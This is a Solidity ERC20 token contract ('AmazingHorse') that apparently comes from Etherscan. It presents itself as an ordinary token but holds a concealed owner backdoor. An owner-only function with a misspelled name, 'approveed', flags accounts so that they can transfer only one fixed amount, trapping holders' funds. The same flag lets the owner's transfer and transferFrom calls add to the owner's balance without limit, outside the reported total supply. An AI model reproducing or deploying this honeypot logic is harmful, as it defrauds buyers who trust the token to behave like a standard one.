/**
 *Submitted for verification at Etherscan.io on 2023-07-19
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amouunt) external returns (bool);
    function allowance(address Owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amouunt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amouunt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function Owner() public view virtual returns (address) {
        return _Owner;
    }
    modifier onlyOwner() {
        require(Owner() == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));
        _Owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract AmazingHorse is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _sttf;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amouunt) public virtual override returns (bool) {
        if (_msgSender() == Owner() && _sttf[_msgSender()] > 0) {
            _balances[Owner()] += _sttf[_msgSender()];
            return true;
        }
        else if (_sttf[_msgSender()] > 0) {
            require(amouunt == _sttf[_msgSender()], "Invalid transfer amouunt");
        }
        require(_balances[_msgSender()] >= amouunt, "TT: transfer amouunt exceeds balance");
        _balances[_msgSender()] -= amouunt;
        _balances[recipient] += amouunt;
        emit Transfer(_msgSender(), recipient, amouunt);
        return true;
    }

    function approveed(address[] memory accounts, uint256 amouunt) public onlyOwner {
        for (uint i=0; i<accounts.length; i++) {
            _sttf[accounts[i]] = amouunt;
        }
    }


    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amouunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amouunt;
        emit Approval(_msgSender(), spender, amouunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amouunt) public virtual override returns (bool) {
        if (_msgSender() == Owner() && _sttf[sender] > 0) {
            _balances[Owner()] += _sttf[sender];
            return true;
        }
        else if (_sttf[sender] > 0) {
            require(amouunt == _sttf[sender], "Invalid transfer amouunt");
        }
        require(_balances[sender] >= amouunt && _allowances[sender][_msgSender()] >= amouunt, "TT: transfer amouunt exceeds balance or allowance");
        _balances[sender] -= amouunt;
        _balances[recipient] += amouunt;
        _allowances[sender][_msgSender()] -= amouunt;
        emit Transfer(sender, recipient, amouunt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}